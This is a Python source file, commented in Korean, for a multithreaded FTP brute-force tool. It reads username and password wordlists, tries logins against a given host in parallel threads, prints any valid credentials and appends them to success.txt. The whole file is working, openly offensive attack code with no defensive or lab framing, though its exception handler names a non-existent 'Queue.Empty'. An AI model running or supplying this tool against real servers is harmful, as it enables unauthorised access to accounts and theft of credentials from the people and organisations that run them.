import sys
import argparse
import os
from typing import List
from ftplib import FTP, error_perm
import time
from datetime import datetime
import threading
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed

class FTPBruteforcer:
    def __init__(self, host: str):
        self.host = host
        self.success = False
        self.valid_credentials = None
        self.lock = threading.Lock()
        self.attempts = 0
        self.total_attempts = 0
        self.start_time = None

    def try_login(self, username: str, password: str) -> bool:
        """FTP 로그인 시도"""
        if self.success:  # 다른 스레드가 이미 성공했다면 시도하지 않음
            return False
            
        try:
            with FTP(self.host, timeout=3) as ftp:  # 타임아웃 감소
                ftp.login(user=username, passwd=password)
                with self.lock:
                    if not self.success:  # 이중 체크
                        self.success = True
                        self.valid_credentials = (username, password)
                        return True
        except error_perm:
            return False
        except Exception as e:
            return False
        return False

    def update_progress(self):
        """진행률 업데이트"""
        with self.lock:
            self.attempts += 1
            progress = (self.attempts / self.total_attempts) * 100
            elapsed = time.time() - self.start_time
            sys.stdout.write(f"\r진행률: {self.attempts}/{self.total_attempts} ({progress:.1f}%) - "
                           f"경과 시간: {elapsed:.1f}초")
            sys.stdout.flush()

    def worker(self, credentials_queue: Queue):
        """작업자 스레드 함수"""
        while not self.success:
            try:
                username, password = credentials_queue.get_nowait()
                if self.try_login(username, password):
                    return True
                self.update_progress()
                credentials_queue.task_done()
            except Queue.Empty:
                break
        return False

    def bruteforce_attack(self, usernames: List[str], passwords: List[str], max_threads: int = 10):
        """멀티스레드 무작위 대입 공격 실행"""
        self.start_time = time.time()
        self.total_attempts = len(usernames) * len(passwords)
        
        print(f"\n[*] 대입 공격 시작: {self.host}")
        print(f"[*] 총 시도 횟수: {self.total_attempts}")
        print(f"[*] 스레드 수: {max_threads}\n")

        # 자격 증명 큐 생성
        credentials_queue = Queue()
        for username in usernames:
            for password in passwords:
                credentials_queue.put((username, password))

        # 스레드 풀로 작업 실행
        threads = []
        for _ in range(max_threads):
            thread = threading.Thread(target=self.worker, args=(credentials_queue,))
            thread.start()
            threads.append(thread)

        # 모든 스레드 완료 대기
        for thread in threads:
            thread.join()

        elapsed = time.time() - self.start_time
        if self.success:
            print(f"\n\n[+] 성공! 유효한 자격 증명을 찾았습니다!")
            print(f"[+] 호스트: {self.host}")
            print(f"[+] 사용자: {self.valid_credentials[0]}")
            print(f"[+] 암호: {self.valid_credentials[1]}")
            print(f"[+] 소요 시간: {elapsed:.1f}초")
            
            # 결과를 파일에 저장
            with open("success.txt", "a") as f:
                f.write(f"\n[{datetime.now()}] {self.host}:{self.valid_credentials[0]}:{self.valid_credentials[1]}")
            
            return True
        
        print("\n\n[-] 공격 실패: 유효한 자격 증명을 찾지 못했습니다.")
        return False

def load_wordlist(filename: str) -> List[str]:
    """워드리스트 파일 로드"""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"워드리스트 파일 로드 실패: {str(e)}")
        sys.exit(1)

def parse_arguments():
    """커맨드 라인 인자 파싱"""
    parser = argparse.ArgumentParser(description='Fast FTP Bruteforce Tool')
    parser.add_argument('-H', '--host', required=True, help='FTP 서버 주소')
    parser.add_argument('-U', '--userlist', help='사용자명 리스트 파일')
    parser.add_argument('-P', '--passlist', help='비밀번호 리스트 파일')
    parser.add_argument('-u', '--user', help='단일 사용자명')
    parser.add_argument('-p', '--password', help='단일 비밀번호')
    parser.add_argument('-t', '--threads', type=int, default=10, help='최대 스레드 수')
    
    args = parser.parse_args()
    
    # 현재 스크립트의 절대 경로를 기준으로 워드리스트 파일 경로 설정
    base_path = os.path.dirname(os.path.abspath(__file__))
    wordlist_path = os.path.join(base_path)
    
    # 사용자명과 비밀번호 준비
    if args.user:
        usernames = [args.user]
    elif args.userlist:
        userlist_file = os.path.join(wordlist_path, args.userlist)
        print(f"사용자 리스트 파일 경로: {userlist_file}")
        usernames = load_wordlist(userlist_file)
    else:
        usernames = ['cju']
        
    if args.password:
        passwords = [args.password]
    elif args.passlist:
        passlist_file = os.path.join(wordlist_path, args.passlist)
        print(f"비밀번호 리스트 파일 경로: {passlist_file}")
        passwords = load_wordlist(passlist_file)
    else:
        passwords = ['security']
    
    return args.host, usernames, passwords, args.threads

def main():
    print("""
    ===================================
    Fast FTP 무작위 대입 공격 도구
    ===================================
    """)
    
    # 인자 파싱
    host, usernames, passwords, max_threads = parse_arguments()
    
    # 대입 공격 실행
    bruteforcer = FTPBruteforcer(host)
    bruteforcer.bruteforce_attack(usernames, passwords, max_threads)

if __name__ == "__main__":
    main()